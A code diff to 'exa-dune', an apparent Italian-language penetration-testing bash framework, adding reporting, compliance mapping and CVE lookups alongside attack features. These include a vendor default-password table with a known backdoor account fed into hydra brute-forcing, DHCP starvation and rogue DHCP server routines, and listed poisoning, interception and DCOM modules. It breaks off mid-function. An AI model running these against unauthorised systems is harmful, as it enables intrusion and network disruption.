@@ -45,7 +45,7 @@
 
 set -euo pipefail
 
-VERSION="3.0.0"
+VERSION="3.1.0"
 SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
 
 # ── Colori ──────────────────────────────────────────────────
@@ -86,6 +86,24 @@ found() {
         # SQLite: registra finding nel DB storico
         _db_insert_finding "$sev" "$msg" 2>/dev/null || true
     fi
+    [[ "$sev" == "HIGH" || "$sev" == "CRITICAL" ]] && \
+        _telegram_notify "$msg" "$sev" || true
+}
+
+# ── Telegram notifications ───────────────────────────────────────────────────
+_telegram_notify() {
+    # Send message to Telegram if configured
+    local msg="$1" level="${2:-INFO}"
+    local token="${TELEGRAM_TOKEN:-${EXA_TELEGRAM_TOKEN:-}}"
+    local chat_id="${TELEGRAM_CHAT_ID:-${EXA_TELEGRAM_CHAT_ID:-}}"
+    [[ -z "$token" || -z "$chat_id" ]] && return 0
+    local emoji="ℹ️"
+    case "$level" in CRITICAL) emoji="🔴" ;; HIGH) emoji="🟠" ;; MEDIUM) emoji="🟡" ;; LOW) emoji="🔵" ;; OK) emoji="✅" ;; esac
+    local full_msg="${emoji} *exa-dune* — ${level}: ${msg}"
+    curl -s -m 5 "https://api.telegram.org/bot${token}/sendMessage" \
+        -d "chat_id=${chat_id}" \
+        -d "parse_mode=Markdown" \
+        --data-urlencode "text=${full_msg}" >/dev/null 2>&1 || true
 }
 
 # ── JSON output helpers ───────────────────────────────────────────────────────
@@ -1169,6 +1187,117 @@ ADAPTIVE=0
 JSON_OUTPUT=0
 CRED_STORE=""          # path a creds.json, impostato da _cred_store_init
 PROPAGATE_CREDS=0      # 1 = abilita propagazione automatica credenziali
+THREADS=4              # default thread count per hydra
+HYDRA_TIMEOUT=5        # timeout hydra in minuti
+
+# ── Config file support ───────────────────────────────────────
+_load_config() {
+    local cfg="${EXA_CONFIG:-$HOME/.exa-dune/config}"
+    [[ ! -f "$cfg" ]] && return 0
+    # Parse KEY=value lines (skip comments and blank lines)
+    while IFS='=' read -r key val; do
+        [[ "$key" =~ ^[[:space:]]*# ]] && continue
+        [[ -z "$key" ]] && continue
+        key="${key// /}"
+        val="${val%%#*}"   # strip inline comments
+        val="${val%"${val##*[! ]}"}"  # rtrim
+        case "$key" in
+            TELEGRAM_TOKEN)      export EXA_TELEGRAM_TOKEN="$val" ;;
+            TELEGRAM_CHAT_ID)    export EXA_TELEGRAM_CHAT_ID="$val" ;;
+            DEFAULT_OUTPUT_DIR)  export EXA_OUTPUT_DIR="$val" ;;
+            DEFAULT_WORDLIST)    export EXA_WORDLIST="$val" ;;
+            HYDRA_TIMEOUT)       export HYDRA_TIMEOUT="$val" ;;
+            NMAP_TIMING)         export EXA_NMAP_TIMING="$val" ;;
+            STEALTH)             [[ "$val" == "1" || "$val" == "true" ]] && STEALTH=1 ;;
+            ADAPTIVE)            [[ "$val" == "1" || "$val" == "true" ]] && ADAPTIVE=1 ;;
+            THREADS)             export THREADS="$val" ;;
+        esac
+    done < "$cfg"
+}
+
+cmd_config() {
+    local cfg="$HOME/.exa-dune/config"
+    if [[ "${1:-}" == "--create" || ! -f "$cfg" ]]; then
+        mkdir -p "$HOME/.exa-dune"
+        cat > "$cfg" <<'CFGEOF'
+# exa-dune configuration file
+# Located at: ~/.exa-dune/config
+
+# Telegram notifications (optional)
+# TELEGRAM_TOKEN=your_bot_token_here
+# TELEGRAM_CHAT_ID=your_chat_id_here
+
+# Default output directory (default: auto-generated in current dir)
+# DEFAULT_OUTPUT_DIR=/root/pentest/reports
+
+# Default wordlist path
+# DEFAULT_WORDLIST=/usr/share/wordlists/rockyou.txt
+
+# Hydra brute-force timeout in minutes (default: 5)
+HYDRA_TIMEOUT=5
+
+# Nmap timing (default: -T4)
+NMAP_TIMING=-T4
+
+# Enable stealth mode by default (0/1)
+STEALTH=0
+
+# Enable adaptive rate limiting (0/1)
+ADAPTIVE=0
+
+# Default thread count for hydra
+THREADS=4
+CFGEOF
+        ok "Config creato: $cfg"
+    fi
+    echo ""
+    echo -e "${BOLD}=== exa-dune config ($cfg) ===${NC}"
+    echo ""
+    if [[ -f "$cfg" ]]; then
+        grep -v "^#\|^$" "$cfg" | while IFS='=' read -r k v; do
+            printf "  ${CYAN}%-25s${NC} = %s\n" "$k" "$v"
+        done
+    fi
+    echo ""
+    echo "  Variabili d'ambiente attive:"
+    [[ -n "${EXA_TELEGRAM_TOKEN:-}" ]] && echo -e "  ${GREEN}TELEGRAM_TOKEN${NC}     = [configurato]"
+    [[ -n "${EXA_TELEGRAM_CHAT_ID:-}" ]] && echo -e "  ${GREEN}TELEGRAM_CHAT_ID${NC}   = ${EXA_TELEGRAM_CHAT_ID}"
+    echo ""
+    echo "  Modifica: $cfg"
+    echo "  Ricrea:   exa-dune config --create"
+}
+
+# ── Default credentials database ─────────────────────────────
+_default_creds_for_vendor() {
+    local vendor="${1,,}"
+    case "$vendor" in
+        audiocodes) echo "Admin:Admin Admin:1234 admin:admin" ;;
+        dahua)      echo "admin:admin admin:dahua888 admin:" ;;
+        hikvision)  echo "admin:12345 admin:Admin1234! admin:admin" ;;
+        axis)       echo "root:pass root: admin:admin" ;;
+        cisco)      echo "cisco:cisco admin:admin enable:cisco" ;;
+        dlink)      echo "admin: admin:admin" ;;
+        netgear)    echo "admin:password admin:1234" ;;
+        zyxel)      echo "admin:1234 admin:admin zyfwp:PrOw!aN_fXp" ;;
+        huawei)     echo "admin:admin admin:Admin@huawei.com" ;;
+        commend)    echo "admin:admin admin:1234 Admin:Admin" ;;
+        gai*)       echo "admin:admin admin:1234 user:user" ;;
+        reolink)    echo "admin: admin:admin admin:12345" ;;
+        *)          echo "admin:admin admin:password admin:1234 root:root" ;;
+    esac
+}
+
+_make_vendor_creds_file() {
+    # Crea file temporaneo coppie user:pass per hydra per un dato vendor
+    local vendor="$1"
+    local tmpfile; tmpfile=$(mktemp)
+    local creds; creds=$(_default_creds_for_vendor "$vendor")
+    for pair in $creds; do
+        echo "${pair//:/ }" | awk '{print "-l "$1" -p "$2}' >> "$tmpfile" 2>/dev/null || true
+        echo "$pair" >> "$tmpfile"
+    done
+    echo "$tmpfile"
+}
 
 # ── Credential Store ─────────────────────────────────────────
 _cred_store_init() {
@@ -9263,10 +9392,12 @@ cmd_auto() {
             return 0
         fi
         (( _mod_done++ )) || true
+        (( _DONE_MODS++ )) || true
         local _ts0; _ts0=$(date +%s)
         local _mod_t=$(( TIMEOUT > 0 ? TIMEOUT : 60 ))
         local _mod_timeout_s=$(( _mod_t * 60 ))
         echo -e "\n  ${BOLD}${CYAN}[Fase ${_phase_num}/4 | #${_mod_done}]${NC} ${BOLD}▶ ${label}${NC} ${CYAN}(max ${_mod_t}m)${NC}"
+        [[ $_TOTAL_MODS -gt 0 ]] && _progress_bar "$_DONE_MODS" "$_TOTAL_MODS" "$label"
         if [[ $DRY_RUN -eq 0 ]]; then
             # shellcheck disable=SC2086
             if timeout "$_mod_timeout_s" exa-dune "$@" $common_flags --output "$OUTDIR_BASE"; then
@@ -9771,6 +9902,22 @@ cmd_auto() {
         echo "$prescan_context" | grep -qiE "onvif|rtsp|webcam|ipcam|nvr|dvr" && \
             [[ $is_camera -eq 0 ]] && detected_vendor="generic"     && is_camera=1
         [[ -n "$detected_vendor" ]] && log "Vendor rilevato dal pre-scan: $detected_vendor (camera=$is_camera voip=$is_voip)"
+    fi
+
+    # ── Auto-populate vendor default credentials ──────────────
+    if [[ -n "${detected_vendor:-}" && -z "${CUSTOM_PASS:-}" ]]; then
+        local _vendor_creds_tmp; _vendor_creds_tmp=$(mktemp)
+        local _creds_str; _creds_str=$(_default_creds_for_vendor "$detected_vendor")
+        for _pair in $_creds_str; do
+            echo "${_pair##*:}" >> "$_vendor_creds_tmp"
+        done
+        if [[ -s "$_vendor_creds_tmp" ]]; then
+            CUSTOM_PASS="$_vendor_creds_tmp"
+            common_flags="$common_flags --passlist $CUSTOM_PASS"
+            log "Default creds per $detected_vendor caricate in wordlist ($(wc -l < "$_vendor_creds_tmp") password)"
+        else
+            rm -f "$_vendor_creds_tmp"
+        fi
     fi
 
     # ── Moduli basati su porte aperte ────────────────────────
@@ -12544,6 +12691,10 @@ except: pass
         echo -e "${CYAN}[DRY-RUN]${NC} xdg-open $EXA_REPORTS_DIR/REPORT_${target}_${base_ts}.pdf"
     fi
 
+    # ── Telegram summary notification ─────────────────────────────
+    local _n_findings="$_f4_total"
+    _telegram_notify "Assessment $target completato: $_n_findings findings (C:$_f4_crit H:$_f4_high M:$_f4_med L:$_f4_low)" "OK" || true
+
     # ── Banner finale ─────────────────────────────────────────────
     local _end_ts; _end_ts=$(date +%s)
     local _duration=$(( _end_ts - _auto_start_ts ))
@@ -12567,6 +12718,84 @@ except: pass
     printf "  %-20s %s\n" "Credenziali:"  "$_f4_creds trovate"
     echo -e "${BOLD}${GREEN}══════════════════════════════════════════${NC}"
     echo ""
+}
+
+# ============================================================
+#  REPORT HELPERS — CVSS lookup, ATT&CK, OWASP IoT
+# ============================================================
+_cvss_lookup() {
+    local cve_id="$1"
+    [[ "$cve_id" != CVE-* ]] && { echo "N/A"; return; }
+    local url="https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${cve_id}"
+    local result
+    result=$(timeout 8 curl -s "$url" 2>/dev/null || echo "")
+    if [[ -n "$result" ]]; then
+        echo "$result" | python3 -c "
+import json,sys
+d=json.load(sys.stdin)
+try:
+    m=d['vulnerabilities'][0]['cve']['metrics']
+    if 'cvssMetricV31' in m:
+        s=m['cvssMetricV31'][0]['cvssData']
+    elif 'cvssMetricV30' in m:
+        s=m['cvssMetricV30'][0]['cvssData']
+    elif 'cvssMetricV2' in m:
+        s=m['cvssMetricV2'][0]['cvssData']
+    else:
+        print('N/A'); exit()
+    print(str(s.get('baseScore','N/A'))+' ('+s.get('baseSeverity','?')+')')
+except: print('N/A')
+" 2>/dev/null || echo "N/A"
+    else
+        echo "N/A"
+    fi
+}
+
+_attck_map() {
+    local finding_text="$1"
+    local technique=""
+    case "${finding_text,,}" in
+        *"brute"*|*"password"*|*"credential"*) technique="T1110 — Brute Force" ;;
+        *"default"*"cred"*|*"default"*"pass"*)  technique="T1078.001 — Default Accounts" ;;
+        *"telnet"*)         technique="T1021.004 — Remote Services: Telnet" ;;
+        *"ssh"*)            technique="T1021.004 — Remote Services: SSH" ;;
+        *"snmp"*)           technique="T1602.001 — SNMP MIB Dump" ;;
+        *"ftp"*)            technique="T1021.004 — Remote Services: FTP" ;;
+        *"upnp"*)           technique="T1590.005 — Network Topology (UPnP)" ;;
+        *"firmware"*)       technique="T1195.002 — Compromise Software Supply Chain" ;;
+        *"cve"*)            technique="T1190 — Exploit Public-Facing Application" ;;
+        *"bypass"*|*"evasion"*) technique="T1562 — Impair Defenses" ;;
+        *"arp"*|*"mitm"*)   technique="T1557.002 — ARP Cache Poisoning" ;;
+        *"mqtt"*)           technique="T1071.001 — App Layer Protocol" ;;
+        *"scan"*|*"port"*)  technique="T1046 — Network Service Discovery" ;;
+        *"smb"*)            technique="T1021.002 — Remote Services: SMB" ;;
+        *"rdp"*)            technique="T1021.001 — Remote Services: RDP" ;;
+        *"ldap"*)           technique="T1087.002 — Domain Account Discovery" ;;
+        *"dns"*)            technique="T1071.004 — Application Layer Protocol: DNS" ;;
+        *"sip"*|*"voip"*)   technique="T1071.001 — Application Layer Protocol: VoIP" ;;
+        *"log4"*|*"jndi"*)  technique="T1190 — Exploit Public-Facing App (Log4Shell)" ;;
+        *"sql"*"inject"*)   technique="T1190 — Exploit Public-Facing App (SQLi)" ;;
+        *"xss"*|*"xxe"*|*"ssrf"*) technique="T1190 — Exploit Public-Facing Application" ;;
+        *) technique="T1590 — Gather Victim Network Information" ;;
+    esac
+    echo "$technique"
+}
+
+_owasp_iot_map() {
+    local finding_text="$1"
+    case "${finding_text,,}" in
+        *"default"*"pass"*|*"weak"*"pass"*|*"brute"*) echo "I1 — Weak/Guessable Passwords" ;;
+        *"telnet"*|*"ftp"*|*"http"*"plain"*)           echo "I2 — Insecure Network Services" ;;
+        *"tls"*|*"ssl"*|*"cert"*|*"https"*)            echo "I3 — Insecure Ecosystem Interfaces" ;;
+        *"update"*|*"firmware"*|*"version"*)            echo "I4 — Lack of Secure Update Mechanism" ;;
+        *"credential"*"store"*|*"hardcoded"*)           echo "I5 — Use of Insecure/Outdated Components" ;;
+        *"privacy"*|*"data"*"leak"*)                    echo "I6 — Insufficient Privacy Protection" ;;
+        *"encrypt"*|*"plain"*"text"*)                   echo "I7 — Insecure Data Transfer/Storage" ;;
+        *"snmp"*|*"upnp"*|*"manage"*)                  echo "I8 — Lack of Device Management" ;;
+        *"hardcoded"*|*"backdoor"*)                     echo "I9 — Insecure Default Settings" ;;
+        *"physical"*|*"uart"*|*"jtag"*)                echo "I10 — Lack of Physical Hardening" ;;
+        *) echo "I8 — Lack of Device Management" ;;
+    esac
 }
 
 # ============================================================
@@ -12719,6 +12948,94 @@ cmd_report() {
             local log_lines; log_lines=$(find "$d" -name "*.log" -o -name "*.txt" 2>/dev/null | wc -l)
             printf "  %-15s → %d file output\n" "$mod" "$log_lines"
         done
+
+        # ── ATTCK + OWASP MAPPING ─────────────────────────────
+        _section "MITRE ATT&CK + OWASP IoT MAPPING"
+        while IFS= read -r -d '' ffile; do
+            while IFS= read -r line; do
+                [[ -z "$line" ]] && continue
+                local _attck; _attck=$(_attck_map "$line")
+                local _owasp; _owasp=$(_owasp_iot_map "$line")
+                printf "  %-50s | ATT&CK: %-40s | OWASP: %s\n" \
+                    "${line:0:48}" "$_attck" "$_owasp"
+            done < "$ffile"
+        done < <(find "$outdir" -name "findings.txt" -print0 2>/dev/null | sort -z)
+
+        # ── CVE ENRICHMENT ────────────────────────────────────
+        _section "CVE ENRICHMENT (NVD)"
+        local _cve_found=0
+        while IFS= read -r -d '' ffile; do
+            while IFS= read -r line; do
+                local _cve_id; _cve_id=$(echo "$line" | grep -oP 'CVE-[0-9]{4}-[0-9]+' | head -1 || true)
+                [[ -z "$_cve_id" ]] && continue
+                local _score; _score=$(_cvss_lookup "$_cve_id")
+                printf "  %-20s CVSS: %s\n" "$_cve_id" "$_score"
+                _cve_found=1
+            done < "$ffile"
+        done < <(find "$outdir" -name "findings.txt" -print0 2>/dev/null | sort -z)
+        [[ $_cve_found -eq 0 ]] && echo "  (nessun CVE rilevato)"
+
+        # ── IEC 62443 COMPLIANCE ──────────────────────────────
+        _section "IEC 62443 — Industrial Cybersecurity Compliance"
+        echo "SL-1 (Basic):"
+        local _has_telnet _has_snmp_v1 _has_https _has_def_creds
+        _has_telnet=$(find "$outdir" -name "findings.txt" -exec grep -li "telnet" {} \; 2>/dev/null | head -1)
+        _has_snmp_v1=$(find "$outdir" -name "findings.txt" -exec grep -li "snmp" {} \; 2>/dev/null | head -1)
+        _has_https=$(find "$outdir" -name "findings.txt" -exec grep -li "https\|tls\|ssl" {} \; 2>/dev/null | head -1)
+        _has_def_creds=$(find "$outdir" -name "findings.txt" -exec grep -li "default\|credential\|brute" {} \; 2>/dev/null | head -1)
+        [[ -n "$_has_telnet" ]]   && echo "  ✗ FAIL — Telnet trovato (req. 4.3.3.5.2: no unencrypted protocols)" \
+                                 || echo "  ✓ PASS — Telnet non rilevato"
+        [[ -n "$_has_snmp_v1" ]]  && echo "  ✗ FAIL — SNMP trovato (req. 4.3.3.3.3: secure protocols)" \
+                                 || echo "  ✓ PASS — SNMP v1/v2c non rilevato"
+        [[ -n "$_has_https" ]]    && echo "  ✓ PASS — HTTPS/TLS disponibile" \
+                                 || echo "  ✗ FAIL — HTTPS/TLS non rilevato"
+        echo "SL-2 (Medium):"
+        [[ -n "$_has_def_creds" ]] && echo "  ✗ FAIL — Credenziali di default trovate (req. 4.3.3.7.2)" \
+                                  || echo "  ✓ PASS — Nessuna credenziale di default rilevata"
+
+        # ── EXECUTIVE SUMMARY ─────────────────────────────────
+        _section "EXECUTIVE SUMMARY — Valutazione per il Cliente"
+        # Conta findings
+        local _es_crit=0 _es_high=0 _es_med=0 _es_low=0 _es_creds=0 _es_ports=0
+        while IFS= read -r -d '' ffile; do
+            while IFS= read -r line; do
+                [[ -z "$line" ]] && continue
+                case "$line" in
+                    \[CRITICAL\]*) ((_es_crit++)) || true ;;
+                    \[HIGH\]*)     ((_es_high++))  || true ;;
+                    \[MEDIUM\]*)   ((_es_med++))   || true ;;
+                    \[LOW\]*)      ((_es_low++))   || true ;;
+                esac
+                echo "$line" | grep -qi "login:\|password\|credential\|cred" && ((_es_creds++)) || true
+            done < "$ffile"
+        done < <(find "$outdir" -name "findings.txt" -print0 2>/dev/null | sort -z)
+        local _nmap_f_es; _nmap_f_es=$(find "$outdir" -maxdepth 2 \
+            \( -name "nmap_fast.nmap" -o -name "nmap_full.nmap" \) 2>/dev/null | head -1)
+        [[ -n "$_nmap_f_es" ]] && _es_ports=$(grep -cE "^[0-9]+/tcp.*open" "$_nmap_f_es" 2>/dev/null || echo 0)
+        local _es_cves; _es_cves=$(find "$outdir" -name "findings.txt" -exec grep -hoP 'CVE-[0-9]{4}-[0-9]+' {} \; 2>/dev/null | sort -u | wc -l)
+
+        local _risk_lvl="BASSO"
+        [[ $_es_low -gt 0 ]]  && _risk_lvl="BASSO"
+        [[ $_es_med -gt 0 ]]  && _risk_lvl="MEDIO"
+        [[ $_es_high -gt 0 ]] && _risk_lvl="ALTO"
+        [[ $_es_crit -gt 0 || ( $_es_high -gt 0 && $_es_creds -gt 0 ) ]] && _risk_lvl="CRITICO"
+
+        echo ""
+        echo "══════════════════════════════════════════════════"
+        echo "  EXECUTIVE SUMMARY — Valutazione per il Cliente"
+        echo "══════════════════════════════════════════════════"
+        echo "Livello di rischio globale: $_risk_lvl"
+        echo ""
+        echo "Punti critici:"
+        printf "  • %d credenziali trovate (accesso confermato)\n" "$_es_creds"
+        printf "  • %d porte ad alto rischio esposte\n" "$_es_ports"
+        printf "  • %d CVE confermati\n" "$_es_cves"
+        echo ""
+        echo "Raccomandazioni prioritarie:"
+        echo "  1. Cambiare immediatamente le credenziali di default"
+        echo "  2. Aggiornare il firmware all'ultima versione"
+        echo "  3. Disabilitare i servizi non necessari (Telnet, SNMP v1/v2)"
+        echo "══════════════════════════════════════════════════"
 
         echo ""
         echo "═══════════════════════════════════════════════════"
@@ -12973,7 +13290,7 @@ HTMLEOF
 
         # 3. FINDINGS DETTAGLIATI
         echo "<h1 class='page-break'>3. Findings Dettagliati</h1>"
-        echo "<table><tr><th style='width:100px'>Severity</th><th style='width:90px'>CVSS 3.1</th><th style='width:100px'>Modulo</th><th>Descrizione</th></tr>"
+        echo "<table><tr><th style='width:90px'>Severity</th><th style='width:80px'>CVSS 3.1</th><th style='width:80px'>Modulo</th><th>Descrizione</th><th style='width:140px'>ATT&amp;CK</th><th style='width:130px'>OWASP IoT</th></tr>"
         local has_findings=0
         while IFS= read -r -d '' ffile; do
             local module; module=$(basename "$(dirname "$ffile")")
@@ -12993,11 +13310,13 @@ HTMLEOF
                     LOW)      cvss_score="0.1 – 3.9" ;;
                     *)        cvss_score="—" ;;
                 esac
-                echo "<tr><td><span class='sev sev-${sev}'>$sev</span></td><td><span class='cvss'>$cvss_score</span></td><td><span class='tag'>$module</span></td><td>$msg</td></tr>"
+                local attck_tech; attck_tech=$(_attck_map "$line" | sed 's/</\&lt;/g;s/>/\&gt;/g')
+                local owasp_cat; owasp_cat=$(_owasp_iot_map "$line" | sed 's/</\&lt;/g;s/>/\&gt;/g')
+                echo "<tr><td><span class='sev sev-${sev}'>$sev</span></td><td><span class='cvss'>$cvss_score</span></td><td><span class='tag'>$module</span></td><td>$msg</td><td><span class='tag' style='font-size:.72em'>$attck_tech</span></td><td><span class='tag' style='font-size:.72em'>$owasp_cat</span></td></tr>"
                 has_findings=1
             done < "$ffile"
         done < <(find "$outdir" -name "findings.txt" -print0 2>/dev/null | sort -z)
-        [[ $has_findings -eq 0 ]] && echo "<tr><td colspan='4'>Nessun finding registrato.</td></tr>"
+        [[ $has_findings -eq 0 ]] && echo "<tr><td colspan='6'>Nessun finding registrato.</td></tr>"
         echo "</table>"
 
         # 4. WEB APPLICATION
@@ -13213,6 +13532,39 @@ PYEOF
             unset CRED_FILE
         fi
         [[ $has_creds -eq 0 ]] && echo "<tr><td colspan='3'>Nessuna credenziale trovata.</td></tr>"
+        echo "</table>"
+
+        # 5b. CVE ENRICHMENT
+        local _cve_list; _cve_list=$(find "$outdir" -name "findings.txt" -exec grep -hoP 'CVE-[0-9]{4}-[0-9]+' {} \; 2>/dev/null | sort -u)
+        if [[ -n "$_cve_list" ]]; then
+            echo "<h1>5b. CVE Enrichment (NVD)</h1>"
+            echo "<table><tr><th>CVE ID</th><th>CVSS Score</th></tr>"
+            while IFS= read -r _cid; do
+                [[ -z "$_cid" ]] && continue
+                local _cscore; _cscore=$(_cvss_lookup "$_cid")
+                echo "<tr><td><code>$_cid</code></td><td><span class='cvss'>$_cscore</span></td></tr>"
+            done <<< "$_cve_list"
+            echo "</table>"
+        fi
+
+        # 5c. IEC 62443 COMPLIANCE
+        echo "<h1>5c. IEC 62443 — Industrial Cybersecurity</h1>"
+        echo "<table><tr><th>Livello</th><th>Requisito</th><th>Stato</th><th>Dettaglio</th></tr>"
+        local _htel _hsnmp _hhttps _hcred
+        _htel=$(find "$outdir" -name "findings.txt" -exec grep -li "telnet" {} \; 2>/dev/null | head -1)
+        _hsnmp=$(find "$outdir" -name "findings.txt" -exec grep -li "snmp" {} \; 2>/dev/null | head -1)
+        _hhttps=$(find "$outdir" -name "findings.txt" -exec grep -li "https\|tls\|ssl" {} \; 2>/dev/null | head -1)
+        _hcred=$(find "$outdir" -name "findings.txt" -exec grep -li "default\|credential\|brute" {} \; 2>/dev/null | head -1)
+        local _pass="<span style='color:#56d364'>✓ PASS</span>"
+        local _fail="<span style='color:#ff7b72'>✗ FAIL</span>"
+        [[ -n "$_htel" ]]   && echo "<tr><td>SL-1</td><td>4.3.3.5.2 — No unencrypted protocols</td><td>$_fail</td><td>Telnet rilevato</td></tr>" \
+                           || echo "<tr><td>SL-1</td><td>4.3.3.5.2 — No unencrypted protocols</td><td>$_pass</td><td>Telnet non rilevato</td></tr>"
+        [[ -n "$_hsnmp" ]]  && echo "<tr><td>SL-1</td><td>4.3.3.3.3 — Secure protocols</td><td>$_fail</td><td>SNMP v1/v2c rilevato</td></tr>" \
+                           || echo "<tr><td>SL-1</td><td>4.3.3.3.3 — Secure protocols</td><td>$_pass</td><td>SNMP v1/v2c non rilevato</td></tr>"
+        [[ -n "$_hhttps" ]] && echo "<tr><td>SL-1</td><td>HTTPS/TLS</td><td>$_pass</td><td>HTTPS/TLS rilevato</td></tr>" \
+                           || echo "<tr><td>SL-1</td><td>HTTPS/TLS</td><td>$_fail</td><td>HTTPS/TLS non rilevato</td></tr>"
+        [[ -n "$_hcred" ]]  && echo "<tr><td>SL-2</td><td>4.3.3.7.2 — Credenziali sicure</td><td>$_fail</td><td>Credenziali di default trovate</td></tr>" \
+                           || echo "<tr><td>SL-2</td><td>4.3.3.7.2 — Credenziali sicure</td><td>$_pass</td><td>Nessuna credenziale di default</td></tr>"
         echo "</table>"
 
         # 6. RACCOMANDAZIONI
@@ -14545,6 +14897,12 @@ cmd_help() {
             printf "  %-15s %s\n" "poison"        "LLMNR/MDNS poisoning + crack (responder, hashcat/john)"
             printf "  %-15s %s\n" "pivot"         "HTTP tunnel + SOCKS5 proxy   (chisel)"
             printf "  %-15s %s\n" "vpn"           "IPsec/IKE VPN enumeration    (ike-scan, PSK capture)"
+            printf "  %-15s %s\n" "dhcp"          "DHCP starvation + rogue DHCP server (yersinia, dnsmasq)"
+            printf "  %-15s %s\n" "rtp"           "RTP stream interception + audio extraction (tcpdump, ffmpeg)"
+            printf "  %-15s %s\n" "dcom"          "DCOM/WMI exploitation        (impacket-wmiexec, dcomexec)"
+            printf "  %-15s %s\n" "config"        "Gestione configurazione       (~/.exa-dune/config)"
+            printf "  %-15s %s\n" "completion"    "Shell auto-completion         (bash/zsh)"
+            printf "  %-15s %s\n" "plugins"       "Gestione plugin               (list/create/dir)"
             echo ""
             echo -e "${BOLD}Esempi:${NC}"
             echo "  exa-dune scan 192.168.1.1 --stealth"
@@ -17641,9 +17999,399 @@ cmd_msf() {
 }
 
 # ============================================================
+#  SUBCOMMAND: completion
+# ============================================================
+cmd_completion() {
+    local shell="${1:-bash}"
+    local all_cmds="scan web sip smb creds snmp ftp ssh telnet mqtt modbus upnp ssl tftp rtsp onvif js dns ipmi coap mdns wsd bacnet rtmp cam-cve sip-fuzz enip vnc rdp ldap redis http post fw auto pipeline report network-sweep self-test diff install wordlists update resume schedule firmware voip-enum config-audit history nuclei mitm poison pivot vpn printer amqp log4shell sqli ssrf xxe opcua dnp3 ble jwt msf config completion dhcp rtp dcom plugins help version"
+    if [[ "$shell" == "zsh" ]]; then
+        cat <<ZSHEOF
+#compdef exa-dune
+_exa_dune() {
+  local -a subcmds
+  subcmds=(${all_cmds// / })
+  _arguments '1:subcommand:($subcmds)' '*:: :->args'
+}
+_exa_dune "\$@"
+ZSHEOF
+    else
+        # bash completion
+        cat <<BASHEOF
+_exa_dune_complete() {
+    local cur="\${COMP_WORDS[COMP_CWORD]}"
+    local cmds="${all_cmds}"
+    COMPREPLY=(\$(compgen -W "\${cmds}" -- "\${cur}"))
+}
+complete -F _exa_dune_complete exa-dune
+BASHEOF
+    fi
+    echo ""
+    echo "# Per attivare:"
+    if [[ "$shell" == "zsh" ]]; then
+        echo "# exa-dune completion zsh > ~/.zsh/completions/_exa-dune"
+        echo "# fpath=(~/.zsh/completions \$fpath) in ~/.zshrc"
+    else
+        echo "# exa-dune completion bash > /etc/bash_completion.d/exa-dune"
+        echo "# oppure: source <(exa-dune completion bash)"
+    fi
+}
+
+# ============================================================
+#  SUBCOMMAND: dhcp
+# ============================================================
+cmd_dhcp() {
+    local iface="" duration=30 mode="starvation"
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --iface)    _req_arg "$1" "${2:-}"; iface="$2";    shift 2 ;;
+            --duration) _req_arg "$1" "${2:-}"; duration="$2"; shift 2 ;;
+            --mode)     _req_arg "$1" "${2:-}"; mode="$2";     shift 2 ;;
+            --dry-run)  DRY_RUN=1; shift ;;
+            --help|-h)  echo "Uso: exa-dune dhcp --iface <IFACE> [--duration SEC] [--mode starvation|rogue|both]"; exit 0 ;;
+            -*)         err "Opzione sconosciuta: $1"; exit 1 ;;
+        esac
+    done
+    [[ -z "$iface" ]] && { err "--iface richiesto"; exit 1; }
+    check_root
+
+    local ts; ts=$(date +%Y%m%d_%H%M%S)
+    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-dhcp_${ts}}"
+    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
+    _log_file="$OUTDIR_BASE/dhcp.log"
+
+    section "DHCP Attack — iface=$iface mode=$mode duration=${duration}s"
+
+    # Cattura traffico DHCP con tcpdump
+    if [[ $DRY_RUN -eq 0 ]]; then
+        log "Avvio cattura DHCP su $iface per ${duration}s..."
+        tcpdump -i "$iface" -w "$OUTDIR_BASE/dhcp_capture.pcap" \
+            "port 67 or port 68" &>/dev/null &
+        local _tcpdump_pid=$!
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} tcpdump -i $iface -w $OUTDIR_BASE/dhcp_capture.pcap port 67 or port 68"
+    fi
+
+    if [[ "$mode" == "starvation" || "$mode" == "both" ]]; then
+        section "DHCP Starvation"
+        if command -v dhcpstarv &>/dev/null; then
+            if [[ $DRY_RUN -eq 1 ]]; then
+                echo -e "${CYAN}[DRY-RUN]${NC} dhcpstarv -i $iface"
+            else
+                timeout "$duration" dhcpstarv -i "$iface" 2>&1 | \
+                    tee "$OUTDIR_BASE/dhcpstarv.txt" || true
+                found MEDIUM "DHCP starvation eseguito su $iface per ${duration}s"
+            fi
+        elif command -v yersinia &>/dev/null; then
+            if [[ $DRY_RUN -eq 1 ]]; then
+                echo -e "${CYAN}[DRY-RUN]${NC} yersinia dhcp -attack 1 -interface $iface"
+            else
+                timeout "$duration" yersinia dhcp -attack 1 -interface "$iface" \
+                    2>&1 | tee "$OUTDIR_BASE/yersinia_starv.txt" || true
+                found MEDIUM "DHCP starvation via yersinia su $iface"
+            fi
+        else
+            warn "dhcpstarv e yersinia non disponibili — installa uno dei due"
+        fi
+    fi
+
+    if [[ "$mode" == "rogue" || "$mode" == "both" ]]; then
+        section "Rogue DHCP Server"
+        if command -v dnsmasq &>/dev/null; then
+            local rogue_range="192.168.1.200,192.168.1.250"
+            if [[ $DRY_RUN -eq 1 ]]; then
+                echo -e "${CYAN}[DRY-RUN]${NC} dnsmasq --no-daemon --interface=$iface --dhcp-range=$rogue_range --no-resolv"
+            else
+                log "Avvio rogue DHCP server: range $rogue_range per ${duration}s"
+                timeout "$duration" dnsmasq --no-daemon \
+                    --interface="$iface" \
+                    --dhcp-range="$rogue_range" \
+                    --no-resolv \
+                    --log-dhcp \
+                    2>&1 | tee "$OUTDIR_BASE/rogue_dhcp.txt" || true
+                found HIGH "Rogue DHCP server attivo su $iface — range $rogue_range"
+            fi
+        else
+            warn "dnsmasq non disponibile: apt install dnsmasq"
+        fi
+    fi
+
+    # Ferma cattura tcpdump
+    if [[ $DRY_RUN -eq 0 && -n "${_tcpdump_pid:-}" ]]; then
+        kill "$_tcpdump_pid" 2>/dev/null || true
+        ok "PCAP salvato: $OUTDIR_BASE/dhcp_capture.pcap"
+    fi
+
+    ok "DHCP attack completato → $OUTDIR_BASE"
+}
+
+# ============================================================
+#  SUBCOMMAND: rtp
+# ============================================================
+cmd_rtp() {
+    local target="" iface="" duration=60 pcap=""
+    while [[ $# -gt 0 ]]; do
